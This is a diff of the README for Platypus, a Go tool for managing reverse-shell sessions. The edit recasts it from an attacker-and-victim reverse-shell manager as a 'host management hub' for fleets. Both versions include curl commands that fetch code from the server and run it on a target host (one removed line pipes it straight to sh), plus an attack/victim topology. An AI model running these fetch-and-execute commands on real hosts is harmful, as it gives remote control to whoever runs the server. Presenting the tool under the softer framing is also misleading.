@@ -5,7 +5,11 @@
 [![GitHub Release Downloads](https://img.shields.io/github/downloads/wangyihang/platypus/total)](https://github.com/WangYihang/Platypus/releases)
 [![Sponsors](https://opencollective.com/platypus/tiers/badge.svg)](https://opencollective.com/platypus)
 
-A modern multiple reverse shell sessions/clients manager via terminal written in Go.
+A host management hub for fleets of Linux machines. Install the Platypus
+agent on every host you own; the agent dials back to your Platypus server
+over TLS + protobuf; from the server you get an interactive shell, file
+management, and network tunnelling on every managed host — through one
+central control plane.
 
 ## Architecture
 
@@ -13,23 +17,23 @@ Platypus ships as three backend binaries plus a standalone desktop client:
 
 | Binary | Role |
 |---|---|
-| `platypus-server`  | Daemon. Runs reverse-shell listeners, manages sessions, exposes REST + WebSocket API. |
-| `platypus-admin`   | CLI client. Talks to `platypus-server` over HTTP; useful for scripting and CI. |
-| `platypus-agent`   | Encrypted controlled-end (formerly "termite"). Connects back to a server over TLS + protobuf. |
+| `platypus-server`  | Daemon. Accepts inbound agent connections on TLS ingress ports; exposes a REST + WebSocket API for admin tooling; serves agent binaries for distribution. |
+| `platypus-admin`   | CLI client. Talks to `platypus-server` over HTTP; scriptable for CI and ops workflows. |
+| `platypus-agent`   | The process that runs on each managed host. Dials back to the server over TLS + protobuf. |
 | `platypus-desktop` | Native (Wails v2) desktop GUI. Connect to any reachable server with URL + secret; tabbed UI for sessions, terminals, listeners, files, tunnels. See [`desktop/`](./desktop/). |
 
-The server is purely an API — no embedded web UI. Multiple desktops can connect to the same server simultaneously.
+The server is purely an API — no embedded web UI. Multiple desktops can
+connect to the same server simultaneously.
 
 ## Features
 
-- Multiple listening ports / multiple concurrent reverse-shell sessions
+- TLS + protobuf channel between agent and server
+- Multiple ingress ports so fleets in different networks share one hub
+- Interactive shell per host, streamed over WebSocket
+- File read / write / upload / download with chunked transfer
+- Network tunnels: local-port-forward, remote-port-forward, dynamic SOCKS5
 - Bearer-token-authenticated [REST API](./docs/RESTful.md)
 - [Python SDK](https://github.com/WangYihang/Platypus-Python)
-- [Reverse shell as a service](/docs/RaaS.md) (10 language templates, no need to memorize one-liners)
-- File download/upload with progress
-- Full interactive shell (vim, Ctrl-C/Z work as expected)
-- Port forwarding (push, pull, dynamic SOCKS5)
-- Encrypted agent channel (TLS + protobuf)
 - Auto-start listeners from `config.yml`
 - Graceful shutdown (drains connections on SIGINT/SIGTERM within 30s)
 
@@ -63,7 +67,7 @@ make desktop-dev        # hot-reload dev mode
 
 ### Or: use the standalone web UI (no install)
 
-For quick feature verification without building a native app — same pages, same features (minus real-time event push), runs in any browser:
+Same pages, same features (minus real-time event push), runs in any browser:
 
 ```bash
 make web-ui             # → desktop/frontend/dist-web/ (static bundle)
@@ -96,186 +100,81 @@ For production, run the server under `systemd` rather than backgrounding it manu
 
 ## Usage
 
-### Network Topology
+### Topology
 
-* Attack IP: `192.168.88.129`
-  * Reverse Shell Service: `0.0.0.0:13337`
-  * Reverse Shell Service: `0.0.0.0:13338`
-  * RESTful Service: `127.0.0.1:7331`
-* Victim IP: `192.168.88.130`
+* Server: `192.168.88.129`
+  * Agent ingress (TLS): `0.0.0.0:13337`
+  * Distributor (agent binary downloads): `0.0.0.0:13339`
+  * REST API: `127.0.0.1:7331`
+* Managed host: `192.168.88.130` (runs `platypus-agent`)
 
-### Give it a try
+### Quick tour
 
-First, run `./Platypus`, then the `config.yml` will be generated automatically, and the config file is simple enough.
+First, run `./platypus-server`. A `config.yml` is generated from
+`assets/config.example.yml` if none exists. Defaults are sensible:
 
 ```yaml
-servers: 
+listeners:
   - host: "0.0.0.0"
     port: 13337
-    # Platypus is able to use several properties as unique identifier (primirary key) of a single client.
-    # All available properties are listed below:
-    # `%i` IP
-    # `%u` Username
-    # `%m` MAC address
-    # `%o` Operating System
-    # `%t` Income TimeStamp
-    hashFormat: "%i %u %m %o"
-  - host: "0.0.0.0"
-    port: 13338
-    # Using TimeStamp allows us to track all connections from the same IP / Username / OS and MAC.
     hashFormat: "%i %u %m %o %t"
+    disable_history: true
+    public_ip: ""
+    shell_path: "/bin/bash"
 restful:
-  host: "127.0.0.1"
+  host: "0.0.0.0"
   port: 7331
   enable: true
-# Check new releases from GitHub when starting Platypus
-update: false
+distributor:
+  host: "0.0.0.0"
+  port: 13339
+  url: "http://127.0.0.1:13339"
+update: true
+openBrowser: false
 ```
 
-![](https://platypus-reverse-shell.vercel.app/images/cli/start.gif)
-
-As you can see, platypus will check for updates, then start listening on port 13337, 13338 and 7331
-
-The three port have different aims.
-- 13337 Reverse shell server, which **disallows** the reverse session comes from the IP.
-- 13338 Reverse shell server, which **allows** the reverse session comes from the IP.
-- 7331 Platypus [RESTful](./doc/RESTful.md) API EndPoint, which allows you to manipulate Platypus through HTTP protocol or [Python SDK](./doc/SDK.md).
-
-If you want another reverse shell listening port, just type `Run 0.0.0.0 1339` or modify the `config.yml`.
-
-Also, platypus will print help information about [RaaS](./doc/RaaS.md) which release you from remembering  tedious reverse shell commands. 
-
-With platypus, all you have to do is just copy-and-paste the `curl` command and execute it on the victim machine.
+On startup the server prints, for every interface it's binding, the
+`curl` command an admin can run on a managed host to fetch and launch
+the agent:
 
 ```bash
-curl http://127.0.0.1:13337/|sh
-curl http://192.168.88.129:13337/|sh
+curl -fsSL http://<server>:13339/agent/<server>:13337 -o /tmp/platypus-agent \
+  && chmod +x /tmp/platypus-agent && /tmp/platypus-agent
 ```
 
-Now, suppose that the victim is attacked by the attacker and a reverse shell command will be executed on the machine of victim.
+The distributor patches the connect-back target into the prebuilt agent
+binary in-place, so the same build serves every ingress. Once the agent
+starts, it dials `server:13337`, the TLS handshake completes, and the
+session appears in the server's session list.
 
-![](https://platypus-reverse-shell.vercel.app/images/cli/connect.gif)
+### Admin CLI
 
-> Notice, the RaaS feature ensure that the reverse shell process is running in background and ignore the hangup signal.
+```bash
+./build/platypus-admin --server http://127.0.0.1:7331 --secret <S> list
+./build/platypus-admin --server http://127.0.0.1:7331 --secret <S> sessions
+./build/platypus-admin --server http://127.0.0.1:7331 --secret <S> exec <hash> -- uname -a
+./build/platypus-admin --server http://127.0.0.1:7331 --secret <S> tunnel ...
+```
 
-## Get start with the admin CLI
+### Desktop / Web
 
-### List all victims
+Open the desktop app (`platypus-desktop`) or the web UI (`make web-ui-serve`),
+fill in the server URL and secret, and you're in. Tabs: Sessions (every
+agent that's dialled in), Terminal, Files, Tunnels, Listeners.
 
-You can use `List` command to print table style infomation about all listening servers and connected clients. Notice that the port `13337` will reset the connection from the same machine (we consider two connection are same iff they share the same Hash value, the info being hash can be configured in `config.yml`). Port `13338` will not reset such connections, which provide more repliability.
+## Advanced usages
 
-![](https://platypus-reverse-shell.vercel.app/images/cli/list.gif)
-
-### Select a victim
-
-`Jump` command can take you a tour between clients.
-Use `Jump [HASH / Alias]` to jump. `Alias` is a alias of a specific client, you can set a alias of a client via `Alias [ALIAS]`.
-Also, for jumping through `HASH`, you do not need to type the whole hash, just prefix of hash will work.
-
-> All commands are case insensitive, feel free to use tab for completing.
-
-![](https://platypus-reverse-shell.vercel.app/images/cli/jump.gif)
-
-
-### Interactive shell
-
-`Interact` will popup a shell, just like `netcat`.
-
-![](https://platypus-reverse-shell.vercel.app/images/cli/interact.gif)
-
-### Download file
-
-Use `Download` command to download file from reverse shell client to attacker's machine.
-
-![](https://platypus-reverse-shell.vercel.app/images/cli/download.gif)
-
-### Upload file
-
-Use `Upload` command to upload file to the current interacting client.
-
-![](https://platypus-reverse-shell.vercel.app/images/cli/upload.gif)
-
-### Interactive shell mode
-
-> This feature only works on *nix clients
-
-> For your user experience, we highly RECOMMEND you use `Upgrade` command to upgrade the plain reverse shell to a encrypted interactive shell.
-
-Try to Spawn `/bin/bash` via Python, then the shell is fully interactive (You can use vim / htop and other stuffs).
-First use `Jump` to select a client, then type `PTY`, then type `Interact` to drop into a fully interactive shell.
-~~You can just simply type `exit` to exit pty mode~~, to avoid the situation in [issue #39](https://github.com/WangYihang/Platypus/issues/39), you can use `platyquit` to quit the fully interactive shell mode.
-
-![](https://platypus-reverse-shell.vercel.app/images/cli/interactive.gif)
-
-
-## Advanced [Usages](./doc)
-
-* Reverse shell as a Service (RaaS)
-* RESTful API
+* [REST API](./docs/RESTful.md)
 * Python SDK
 
-## Other Materials
+## Other materials
 
 * [Presentation on KCon 2019](https://github.com/WangYihang/Presentations/blob/master/2019-08-24%20Introduction%20to%20Platypus%20(KCon)/Introduction%20to%20Platypus%20on%20KCon%202019.pdf)
 * [Presentation on GCSIS 2021](https://github.com/WangYihang/Presentations/blob/master/2021-04-24%20Introduction%20to%20Platypus%20(GCSIS)/Introduction%20to%20Platypus%20on%20GCSIS%202021.pptx)
-* [Demostration Video](http://www.youtube.com/watch?v=Yfy6w8qXcQs "Platypus")
-
-## TODOs
-- [ ] [#10 Use database to record all events and interacting logs](https://github.com/WangYihang/Platypus/issues/10)
-- [ ] Router through clients
-- [ ] Visualize network topology
-- [ ] Host discovery via multiple method (eg: `arp -a`)
-- [ ] Redesign frontend (eg: Listener list, Machine list, Network topology graph, File management...)
-- [ ] [WIP] Add authencation in RESTful API
-- [ ] Use crontab
-- [ ] Provide full kernel API
-- [ ] [WIP] Support file operations
-- [ ] Check whether dst is a folder in file uploading 
-- [ ] Benchmark
-- [ ] [#24 Upgrading platypus to a system service](https://github.com/WangYihang/Platypus/issues/24)
-- [ ] Upgrade to Metepreter session
-- [ ] Electron frontend
-- [ ] [#53 Reload config file](https://github.com/WangYihang/Platypus/issues/53)
-- [x] Add version checking in Termite
-- [x] [#28 Suport enable internet on the internal machine](https://github.com/WangYihang/Platypus/issues/28))
-- [x] [#28 Suport dynamic port forwarding](https://github.com/WangYihang/Platypus/issues/28))
-- [x] [#28 Suport remote port forwarding](https://github.com/WangYihang/Platypus/issues/28))
-- [x] [#28 Suport local port forwarding](https://github.com/WangYihang/Platypus/issues/28))
-- [x] Design Private Protocol
-- [x] Check exit state in WebSocket
-- [x] ~~Use HR package to detect the status of client (maybe `echo $random_string`)~~
-- [x] Notify window resize (Only works in all cases when private protocol established)
-- [x] Upgrade to private protocol
-- [x] [#15 Encryption support](https://github.com/WangYihang/Platypus/issues/15)
-- [x] Web UI
-- [x] More interfaces in RESTful API
-- [x] Websocket for Web UI 
-- [x] Continuous Integration
-- [x] [#12 Add capability of setting human-readable name of session](https://github.com/WangYihang/Platypus/issues/12)
-- [x] [#7 Allow user to choose operation for the same IP income connection](https://github.com/WangYihang/Platypus/issues/7)
-- [x] [#25 Replace new connection from same IP with old one](https://github.com/WangYihang/Platypus/issues/25)
-- [x] Test driven development [WIP]
-- [x] [#19 Read command file when start up](https://github.com/WangYihang/Platypus/issues/19)
-- [x] Add config file
-- [x] [#30 RaaS support specifying language, thanks for @RicterZ](https://github.com/WangYihang/Platypus/issues/30)  
-- [x] Execute user input when input is not a built-in command
-- [x] Download/Upload progress bar
-- [x] [#6 Send one command to all clients at once (Meta Command)](https://github.com/WangYihang/Platypus/issues/6)
-- [x] User guide
-- [x] Upload file
-- [x] Download file
-- [x] [#13 Add a display current prompt setting](https://github.com/WangYihang/Platypus/issues/13)
-- [x] [DEPRECATED] Global Config (eg. [#9 BlockSameIP](https://github.com/WangYihang/Platypus/pull/9))
-- [x] [#11 Make STDOUT and STDERR distinguishable](https://github.com/WangYihang/Platypus/issues/11)
-- [x] [#23 Case insensitive CLI](https://github.com/WangYihang/Platypus/issues/23)
-- [x] Delete command by [@EddieIvan01](https://github.com/EddieIvan01)
-- [x] OS Detection (Linux|Windows) by [@EddieIvan01](https://github.com/EddieIvan01)
-- [x] Upgrade common reverse shell session into full interactive session
-- [x] Docker support (Added by [@yeya24](https://github.com/yeya24))
 
 ## Contributors
 
-This project exists thanks to all the people who contribute. 
+This project exists thanks to all the people who contribute.
 <a href="https://github.com/WangYihang/Platypus/graphs/contributors"><img src="https://opencollective.com/Platypus/contributors.svg?width=890&button=false" /></a>
 
 ## Backers
@@ -283,7 +182,6 @@ This project exists thanks to all the people who contribute.
 Thank you to all our backers! 🙏 [[Become a backer](https://opencollective.com/Platypus#backer)]
 
 <a href="https://opencollective.com/Platypus#backers" target="_blank"><img src="https://opencollective.com/Platypus/backers.svg?width=890"></a>
-
 
 ## Sponsors
 
@@ -294,13 +192,3 @@ Support this project by becoming a sponsor. Your logo will show up here with a l
 <a href="https://opencollective.com/Platypus/sponsor/2/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/2/avatar.svg"></a>
 <a href="https://opencollective.com/Platypus/sponsor/3/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/3/avatar.svg"></a>
 <a href="https://opencollective.com/Platypus/sponsor/4/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/4/avatar.svg"></a>
-<a href="https://opencollective.com/Platypus/sponsor/5/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/5/avatar.svg"></a>
-<a href="https://opencollective.com/Platypus/sponsor/6/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/6/avatar.svg"></a>
-<a href="https://opencollective.com/Platypus/sponsor/7/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/7/avatar.svg"></a>
-<a href="https://opencollective.com/Platypus/sponsor/8/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/8/avatar.svg"></a>
-<a href="https://opencollective.com/Platypus/sponsor/9/website" target="_blank"><img src="https://opencollective.com/Platypus/sponsor/9/avatar.svg"></a>
-
-# 404StarLink 2.0 - Galaxy
-
-![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)
-Platypus has joined 404Team [404StarLink 2.0 - Galaxy](https://github.com/knownsec/404StarLink2.0-Galaxy)
